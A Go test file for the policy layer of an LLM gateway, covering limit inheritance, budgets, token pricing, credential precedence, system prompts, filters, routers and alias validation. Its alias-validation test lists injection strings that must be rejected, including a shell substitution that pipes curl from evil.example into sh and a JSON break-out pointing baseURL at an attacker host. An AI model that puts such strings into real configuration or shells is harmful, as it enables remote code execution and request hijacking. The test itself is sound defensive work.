package policy

import (
	"slices"
	"strings"
	"testing"
	"time"
)

func TestResolveIsRestrictOnly(t *testing.T) {
	key := Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"}

	tests := []struct {
		name             string
		org, team, own   *Limits
		wantModels       []string
		wantMaxOutTokens int
	}{
		{
			name:       "nothing set anywhere is unrestricted",
			wantModels: nil,
		},
		{
			name:       "an org allow-list applies to a key that sets none",
			org:        &Limits{AllowedModels: []string{"keera-code", "keera-embed"}},
			wantModels: []string{"keera-code", "keera-embed"},
		},
		{
			name:       "a team narrows the org list",
			org:        &Limits{AllowedModels: []string{"keera-code", "keera-embed"}},
			team:       &Limits{AllowedModels: []string{"keera-code"}},
			wantModels: []string{"keera-code"},
		},
		{
			name: "a team cannot widen the org list",
			org:  &Limits{AllowedModels: []string{"keera-code"}},
			team: &Limits{AllowedModels: []string{"keera-code", "keera-premium"}},
			// The department administrator asked for keera-premium. The
			// organisation never granted it, so it is not granted.
			wantModels: []string{"keera-code"},
		},
		{
			name:       "an intersection can be empty, which allows nothing",
			org:        &Limits{AllowedModels: []string{"keera-code"}},
			team:       &Limits{AllowedModels: []string{"keera-premium"}},
			wantModels: []string{},
		},
		{
			name:             "the tightest output cap wins regardless of level",
			org:              &Limits{MaxOutputTokens: new(4096)},
			team:             &Limits{MaxOutputTokens: new(8192)},
			own:              &Limits{MaxOutputTokens: new(2048)},
			wantMaxOutTokens: 2048,
		},
		{
			name:             "a level that sets no cap inherits the one above",
			org:              &Limits{MaxOutputTokens: new(4096)},
			wantMaxOutTokens: 4096,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := Resolve(key, tc.org, tc.team, tc.own)
			if !slices.Equal(got.AllowedModels, tc.wantModels) {
				t.Errorf("AllowedModels = %v, want %v", got.AllowedModels, tc.wantModels)
			}
			if got.MaxOutputTokens != tc.wantMaxOutTokens {
				t.Errorf("MaxOutputTokens = %d, want %d", got.MaxOutputTokens, tc.wantMaxOutTokens)
			}
		})
	}
}

func TestResolveKeepsBudgetsPerScope(t *testing.T) {
	// An org cap and a team cap are two limits that both have to hold, so they
	// must not be collapsed into one the way the ceilings are.
	got := Resolve(
		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
		&Limits{BudgetMicros: new(int64(10_000_000))},
		&Limits{BudgetMicros: new(int64(1_000_000)), BudgetPeriod: new(PeriodDay)},
		nil,
	)
	if len(got.Scopes) != 3 {
		t.Fatalf("got %d scopes, want org, team and key", len(got.Scopes))
	}
	if got.Scopes[0].BudgetMicros != 10_000_000 || got.Scopes[0].Period != PeriodMonth {
		t.Errorf("org scope = %+v, want the org's own monthly budget", got.Scopes[0])
	}
	if got.Scopes[1].BudgetMicros != 1_000_000 || got.Scopes[1].Period != PeriodDay {
		t.Errorf("team scope = %+v, want the team's own daily budget", got.Scopes[1])
	}
	if got.Scopes[2].BudgetMicros != 0 {
		t.Errorf("key scope = %+v, want no budget of its own", got.Scopes[2])
	}
}

func TestResolveSkipsTeamScopeForAKeyWithoutOne(t *testing.T) {
	got := Resolve(Key{ID: "key_1", OrgID: "org_1"}, nil, &Limits{RPM: new(1)}, nil)
	if len(got.Scopes) != 2 {
		t.Fatalf("got %d scopes, want org and key only", len(got.Scopes))
	}
	for _, sc := range got.Scopes {
		if sc.Type == ScopeTeam {
			t.Errorf("a key with no team must not be limited by a team scope: %+v", sc)
		}
	}
}

func TestAllowsModel(t *testing.T) {
	unrestricted := &Resolved{}
	if !unrestricted.AllowsModel("anything") {
		t.Error("a nil allow-list must mean every model, not none")
	}
	restricted := &Resolved{AllowedModels: []string{"keera-code"}}
	if !restricted.AllowsModel("keera-code") || restricted.AllowsModel("keera-premium") {
		t.Error("an allow-list must admit exactly what it lists")
	}
	empty := &Resolved{AllowedModels: []string{}}
	if empty.AllowsModel("keera-code") {
		t.Error("an empty allow-list must admit nothing")
	}
}

func TestPeriodStart(t *testing.T) {
	// Budgets reset on UTC boundaries whatever the cluster's timezone, so a
	// spend figure means the same thing in Zurich as in the report.
	at := time.Date(2026, 9, 6, 1, 30, 0, 0, time.FixedZone("CEST", 2*3600))
	if got := PeriodDay.Start(at); !got.Equal(time.Date(2026, 9, 5, 0, 0, 0, 0, time.UTC)) {
		t.Errorf("day start = %v, want 2026-09-05T00:00:00Z (01:30 CEST is still the 5th in UTC)", got)
	}
	if got := PeriodMonth.Start(at); !got.Equal(time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)) {
		t.Errorf("month start = %v, want 2026-09-01T00:00:00Z", got)
	}
}

func TestModelCost(t *testing.T) {
	// 2.50 per million in, 10.00 per million out.
	m := Model{InputMicrosPerMTok: 2_500_000, OutputMicrosPerMTok: 10_000_000}
	if got := m.Cost(1_000_000, 0, 100_000); got != 2_500_000+1_000_000 {
		t.Errorf("Cost = %d, want %d", got, 3_500_000)
	}
	if got := m.Cost(0, 0, 0); got != 0 {
		t.Errorf("Cost of nothing = %d, want 0", got)
	}
	free := Model{}
	if got := free.Cost(999_999_999, 999_999_999, 999_999_999); got != 0 {
		t.Errorf("a model with no prices must cost nothing, got %d", got)
	}
}

// Cached tokens are charged at their own rate, and are part of the prompt, not
// added to it. On a long coding session most of the prompt is cached.
func TestModelCostChargesCachedInputAtItsOwnRate(t *testing.T) {
	// 2.50 per million in, 0.25 per million of that served from the cache.
	m := Model{
		InputMicrosPerMTok:       2_500_000,
		CachedInputMicrosPerMTok: 250_000,
		OutputMicrosPerMTok:      10_000_000,
	}
	// A million-token prompt, 800,000 of it cached: 200,000 at 2.50 and
	// 800,000 at 0.25 per million.
	const want = int64(500_000 + 200_000)
	if got := m.Cost(1_000_000, 800_000, 0); got != want {
		t.Errorf("Cost = %d, want %d", got, want)
	}
	// The same prompt priced as if none of it had been cached, which is what
	// this gateway charged for it before the rate existed. If these two ever
	// come out equal the discount is not being applied.
	if got := m.Cost(1_000_000, 0, 0); got != 2_500_000 {
		t.Errorf("uncached Cost = %d, want 2500000", got)
	}
}

// A model with no cached rate charges those tokens at the full input price,
// because zero means "not stated", not "free".
func TestModelCostChargesUnstatedCachedInputAtTheInputRate(t *testing.T) {
	m := Model{InputMicrosPerMTok: 2_500_000, OutputMicrosPerMTok: 10_000_000}
	if got := m.Cost(1_000_000, 800_000, 0); got != 2_500_000 {
		t.Errorf("Cost = %d, want the full input price 2500000", got)
	}
}

// The counts come off somebody else's response body, so a cached count larger
// than the prompt it is part of - or a negative one - has to price as
// something rather than as a refund.
func TestModelCostClampsAnImpossibleCachedCount(t *testing.T) {
	m := Model{InputMicrosPerMTok: 2_500_000, CachedInputMicrosPerMTok: 250_000}
	if got := m.Cost(1_000_000, 4_000_000, 0); got != 250_000 {
		t.Errorf("Cost of an over-large cached count = %d, want the whole prompt "+
			"at the cached rate, 250000", got)
	}
	if got := m.Cost(1_000_000, -1, 0); got != 2_500_000 {
		t.Errorf("Cost of a negative cached count = %d, want the whole prompt "+
			"at the input rate, 2500000", got)
	}
}

func TestResolveOrgIsOrgScopedOnly(t *testing.T) {
	// The panel's playground has no key. Charging one to a scope nothing else
	// refers to would leave orphan rows in the spend table, and skipping the
	// organisation's own limits would make the panel a way round them.
	const budget = int64(5_000_000)
	const rpm = 30
	r := ResolveOrg("org_1", "user_7", &Limits{
		AllowedModels: []string{"keera-code"},
		RPM:           new(rpm),
		BudgetMicros:  new(budget),
	})

	if len(r.Scopes) != 1 {
		t.Fatalf("Scopes = %+v, want only the organisation", r.Scopes)
	}
	sc := r.Scopes[0]
	if sc.Type != ScopeOrg || sc.ID != "org_1" {
		t.Errorf("scope = %s/%s, want org/org_1", sc.Type, sc.ID)
	}
	if sc.RPM != rpm || sc.BudgetMicros != budget {
		t.Errorf("scope = %+v; the organisation's limits must still apply", sc)
	}
	if r.AllowsModel("keera-premium") {
		t.Error("the organisation's allow-list must bind a request made from the panel")
	}
	if r.Key.OrgID != "org_1" || r.Key.UserID != "user_7" {
		t.Errorf("Key = %+v; usage has to name the person who typed it", r.Key)
	}
	if r.Key.ID != "" {
		t.Errorf("Key.ID = %q, want empty: there is no key behind a panel request", r.Key.ID)
	}
}

func TestResolveOrgWithoutLimitsIsUnlimited(t *testing.T) {
	r := ResolveOrg("org_1", "user_7", &Limits{})
	if !r.AllowsModel("anything") {
		t.Error("an organisation with no allow-list must reach the whole catalogue")
	}
	if r.Scopes[0].RPM != 0 || r.Scopes[0].BudgetMicros != 0 {
		t.Errorf("scope = %+v, want no ceilings", r.Scopes[0])
	}
}

func TestCredentialPrefersTheStoredKeyOverTheEnvironment(t *testing.T) {
	env := func(name string) string {
		return map[string]string{"ANTHROPIC_API_KEY": "sk-from-the-environment"}[name]
	}

	// A provider preset fills in api_key_env whether or not a key was typed
	// into the panel, so both are routinely present. The one an operator typed
	// is the deliberate one.
	both := Model{APIKey: "sk-from-the-panel", APIKeyEnv: "ANTHROPIC_API_KEY"}
	if got := both.Credential(env); got != "sk-from-the-panel" {
		t.Errorf("Credential = %q, want the stored key", got)
	}

	fromEnv := Model{APIKeyEnv: "ANTHROPIC_API_KEY"}
	if got := fromEnv.Credential(env); got != "sk-from-the-environment" {
		t.Errorf("Credential = %q, want the environment's", got)
	}

	// A stored credential the gateway could not decrypt leaves APIKey empty,
	// and must not silently fall through to an unrelated variable's value.
	unreadable := Model{HasAPIKey: true}
	if got := unreadable.Credential(env); got != "" {
		t.Errorf("Credential = %q, want nothing", got)
	}

	local := Model{}
	if got := local.Credential(env); got != "" {
		t.Errorf("Credential = %q; an in-cluster backend is sent no credential", got)
	}
	if got := both.Credential(nil); got != "sk-from-the-panel" {
		t.Errorf("Credential = %q with no environment lookup", got)
	}
}

func TestPeriodNextIsWhenABudgetLifts(t *testing.T) {
	// The one thing a developer refused by a budget needs, and the one thing
	// "budget exceeded" on its own never says.
	at := time.Date(2026, 12, 14, 9, 30, 0, 0, time.UTC)
	if got := PeriodMonth.Next(at); !got.Equal(time.Date(2027, 1, 1, 0, 0, 0, 0, time.UTC)) {
		t.Errorf("month rolls to %s, want 2027-01-01", got)
	}
	if got := PeriodDay.Next(at); !got.Equal(time.Date(2026, 12, 15, 0, 0, 0, 0, time.UTC)) {
		t.Errorf("day rolls to %s, want 2026-12-15", got)
	}
}

func TestBudgetRefusalNamesTheScopeAndTheReset(t *testing.T) {
	err := &ErrBudgetExceeded{
		Scope:    Scope{Type: ScopeTeam, ID: "team_9f2", Period: PeriodMonth},
		Spent:    512_400_000,
		Budget:   500_000_000,
		ResetsAt: time.Date(2026, 10, 1, 0, 0, 0, 0, time.UTC),
	}
	msg := err.Error()
	for _, want := range []string{"your team", "512.40", "500.00", "1 October 2026"} {
		if !strings.Contains(msg, want) {
			t.Errorf("the message does not say %q: %s", want, msg)
		}
	}
	// The id is the tenancy's business, not the developer's: they cannot act on
	// it and it is noise in an editor's error toast.
	if strings.Contains(msg, "team_9f2") {
		t.Errorf("the message quotes an internal id: %s", msg)
	}
}

func TestResolveConcatenatesSystemPrompts(t *testing.T) {
	key := Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"}

	tests := []struct {
		name           string
		org, team, own *Limits
		want           string
	}{
		{
			name: "nothing set anywhere leaves the conversation alone",
		},
		{
			name: "an org prompt reaches a key that sets none",
			org:  &Limits{SystemPrompt: new("Answer in British English.")},
			want: "Answer in British English.",
		},
		{
			name: "a team adds to the org rather than replacing it",
			org:  &Limits{SystemPrompt: new("Answer in British English.")},
			team: &Limits{SystemPrompt: new("Never suggest a new dependency.")},
			// The department administrator cannot drop the organisation's
			// instruction, which is the whole point of the ordering.
			want: "Answer in British English.\n\nNever suggest a new dependency.",
		},
		{
			name: "all three levels are sent, outermost first",
			org:  &Limits{SystemPrompt: new("One.")},
			team: &Limits{SystemPrompt: new("Two.")},
			own:  &Limits{SystemPrompt: new("Three.")},
			want: "One.\n\nTwo.\n\nThree.",
		},
		{
			name: "a level that sets only whitespace adds nothing",
			org:  &Limits{SystemPrompt: new("One.")},
			team: &Limits{SystemPrompt: new("   \n  ")},
			want: "One.",
		},
		{
			name: "a gap in the middle does not leave a stray separator",
			org:  &Limits{SystemPrompt: new("One.")},
			own:  &Limits{SystemPrompt: new("Three.")},
			want: "One.\n\nThree.",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := Resolve(key, tc.org, tc.team, tc.own).SystemPrompt; got != tc.want {
				t.Errorf("SystemPrompt = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResolveOrgCarriesTheOrgPrompt(t *testing.T) {
	// The panel's playground holds no key, so the organisation's standing
	// instruction is the only one there is - and it still applies, or the
	// playground would be a way to ask a model what it says unguarded.
	r := ResolveOrg("org_1", "user_1", &Limits{SystemPrompt: new("Answer in British English.")})
	if r.SystemPrompt != "Answer in British English." {
		t.Errorf("SystemPrompt = %q, want the organisation's", r.SystemPrompt)
	}
}

func TestSameDeclarationIgnoresOnlyTheCredential(t *testing.T) {
	declared := Model{
		Alias: "keera-frontier", Kind: KindChat,
		Backends: []string{"https://api.anthropic.com/v1"}, BackendModel: "claude-opus-5",
		InputMicrosPerMTok: 5_000_000, OutputMicrosPerMTok: 25_000_000,
		MaxContext: 1_000_000, APIKeyEnv: "ANTHROPIC_API_KEY", Enabled: true,
		Managed: true,
	}

	t.Run("a credential is not part of the declaration", func(t *testing.T) {
		// Which is what lets an operator give a file-declared model its key:
		// no catalogue file carries one, so no restart can overwrite it.
		incoming := declared
		incoming.Managed, incoming.HasAPIKey = false, true
		incoming.APIKey, incoming.APIKeyCiphertext = "sk-live", []byte("sealed")
		if !declared.SameDeclaration(incoming) {
			t.Error("a credential-only change read as a change to the model")
		}
	})

	for _, tc := range []struct {
		name   string
		change func(*Model)
	}{
		{"a backend", func(m *Model) { m.Backends = []string{"http://vllm:8000/v1"} }},
		{"one backend of several", func(m *Model) {
			m.Backends = append(append([]string{}, m.Backends...), "http://vllm:8000/v1")
		}},
		{"the backend model", func(m *Model) { m.BackendModel = "claude-sonnet-5" }},
		{"the kind", func(m *Model) { m.Kind = KindEmbedding }},
		{"a price", func(m *Model) { m.OutputMicrosPerMTok = 1 }},
		{"the context window", func(m *Model) { m.MaxContext = 200_000 }},
		{"the credential variable", func(m *Model) { m.APIKeyEnv = "OTHER_KEY" }},
		{"whether it is served", func(m *Model) { m.Enabled = false }},
	} {
		t.Run(tc.name+" is a change to the model", func(t *testing.T) {
			incoming := declared
			tc.change(&incoming)
			if declared.SameDeclaration(incoming) {
				t.Errorf("changing %s went unnoticed", tc.name)
			}
		})
	}
}

func TestFiltersAccumulateOutermostFirst(t *testing.T) {
	r := Resolve(
		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
		&Limits{Filters: []string{"redact-secrets"}},
		&Limits{Filters: []string{"redact-clients"}},
		&Limits{Filters: []string{"strip-tickets"}},
	)
	want := []string{"redact-secrets", "redact-clients", "strip-tickets"}
	if !slices.Equal(r.Filters, want) {
		t.Errorf("Filters = %q, want %q - a level adds to what is above it and "+
			"the order is the order they run in", r.Filters, want)
	}
}

func TestALevelCannotDropAFilterAboveIt(t *testing.T) {
	r := Resolve(
		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
		&Limits{Filters: []string{"redact-secrets"}},
		&Limits{}, // the team says nothing
		&Limits{Filters: []string{"strip-tickets"}},
	)
	if !slices.Contains(r.Filters, "redact-secrets") {
		t.Errorf("Filters = %q; the organisation's filter must survive a level "+
			"that did not repeat it", r.Filters)
	}
}

func TestAFilterNamedTwiceRunsOnce(t *testing.T) {
	r := Resolve(
		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
		&Limits{Filters: []string{"redact-secrets"}},
		&Limits{Filters: []string{"redact-secrets"}},
		&Limits{Filters: []string{"redact-secrets", "strip-tickets"}},
	)
	want := []string{"redact-secrets", "strip-tickets"}
	if !slices.Equal(r.Filters, want) {
		t.Errorf("Filters = %q, want %q - a second pass over redacted text costs "+
			"as much as the first and finds nothing", r.Filters, want)
	}
}

func TestResolveOrgKeepsTheOrganisationsFilters(t *testing.T) {
	r := ResolveOrg("org_1", "usr_1", &Limits{Filters: []string{"redact-secrets"}})
	if !slices.Equal(r.Filters, []string{"redact-secrets"}) {
		t.Errorf("Filters = %q; the panel's playground must meet the same filters "+
			"an editor does", r.Filters)
	}
}

func TestValidFilterAlias(t *testing.T) {
	valid := []string{"redact", "redact-secrets", "pii2", "a"}
	for _, alias := range valid {
		if !ValidFilterAlias(alias) {
			t.Errorf("ValidFilterAlias(%q) = false, want true", alias)
		}
	}
	invalid := []string{
		"", "Redact", "redact secrets", "redact_secrets", "-redact", "redact-",
		"redact/secrets", "réduire", strings.Repeat("a", 65),
	}
	for _, alias := range invalid {
		if ValidFilterAlias(alias) {
			t.Errorf("ValidFilterAlias(%q) = true; an alias goes into a guardrail, a "+
				"command line and a URL unquoted", alias)
		}
	}
}

func TestValidAlias(t *testing.T) {
	valid := []string{"keera-code", "keera-speed", "llama3", "a"}
	for _, alias := range valid {
		if !ValidAlias(alias) {
			t.Errorf("ValidAlias(%q) = false, want true", alias)
		}
	}
	// `keera connect` prints aliases into JSON and shell without escaping, so
	// these shapes would break out of what it prints.
	invalid := []string{
		"", "Keera-Code", "keera code", "keera_code", "-keera", "keera-",
		"keera/code", "modèle", strings.Repeat("a", 65),
		`keera", "options": {"baseURL": "https://evil.example/v1"}, "x": "`,
		"keera$(curl -s http://evil.example/x|sh)", "keera'", "keera\"", "keera;id",
		"keera\n", "keera`id`",
	}
	for _, alias := range invalid {
		if ValidAlias(alias) {
			t.Errorf("ValidAlias(%q) = true; an alias is rendered into a client's JSON "+
				"and into a shell profile, quoted in neither", alias)
		}
	}
}

func TestAFilterWithNoModeWrittenDownIsARewriteFilter(t *testing.T) {
	// Every filter that existed before there were two modes rewrote, so the
	// zero value has to mean that: a stored row read back without a mode must
	// not turn into something that only ever says no.
	if !FilterMode("").Rewrites() {
		t.Error("a filter with no mode written down does not rewrite")
	}
	if !ValidFilterMode("") {
		t.Error("a filter with no mode written down is rejected")
	}
	if FilterModeGate.Rewrites() {
		t.Error("a gate rewrites; it is the one thing it must never do")
	}
	if !FilterModeRewrite.Rewrites() {
		t.Error("a rewrite filter does not rewrite")
	}
	if ValidFilterMode("judge") {
		t.Error("an unknown mode was accepted")
	}
}

func TestARouterWithNoFallbackRefusesWhatItCannotPlace(t *testing.T) {
	// The two are one field rather than two, so that "where does a request go
	// when the decision cannot be made" has exactly one answer per router.
	cheap := Router{Destinations: []string{"keera-small", "keera-large"}, Fallback: "keera-small"}
	if cheap.Refuses() {
		t.Error("a router with a fallback refuses; it has somewhere to send the request")
	}
	strict := Router{Destinations: []string{"keera-small", "keera-large"}}
	if !strict.Refuses() {
		t.Error("a router with no fallback does not refuse, so an undecided prompt would " +
			"go to whichever model was named in a column")
	}
}

func TestARouterOnlyOffersWhatItsListNames(t *testing.T) {
	// Offers is what stands between a small model's one-word answer to
	// somebody else's prose and a request leaving the cluster, so it is
	// exact: no case folding, no prefixes, no near misses.
	rt := Router{Destinations: []string{"keera-small", "keera-large"}}
	for _, alias := range []string{"keera-small", "keera-large"} {
		if !rt.Offers(alias) {
			t.Errorf("Offers(%q) = false, want true", alias)
		}
	}
	for _, alias := range []string{"keera-huge", "keera", "keera-small-eu", "Keera-Small", ""} {
		if rt.Offers(alias) {
			t.Errorf("Offers(%q) = true; a destination this router was not given is not one "+
				"it may reach", alias)
		}
	}
}

func TestARouterNameHasToSurviveWhateverAnAliasDoes(t *testing.T) {
	// A router's name goes where an alias goes - into a developer's own client
	// configuration, rendered there by `keera connect`, quoted by nothing - so
	// the two shapes have to keep agreeing.
	for _, name := range []string{"auto", "route-by-cost", "r2"} {
		if !ValidRouterAlias(name) {
			t.Errorf("ValidRouterAlias(%q) = false", name)
		}
		if !ValidAlias(name) {
			t.Errorf("ValidAlias(%q) = false, so the two shapes have drifted", name)
		}
	}
	for _, name := range []string{"", "Auto", "-auto", "auto-", "auto route", "auto/1",
		"auto\n", strings.Repeat("a", 65)} {
		if ValidRouterAlias(name) {
			t.Errorf("ValidRouterAlias(%q) = true; it is typed into a client's own "+
				"configuration", name)
		}
	}
}
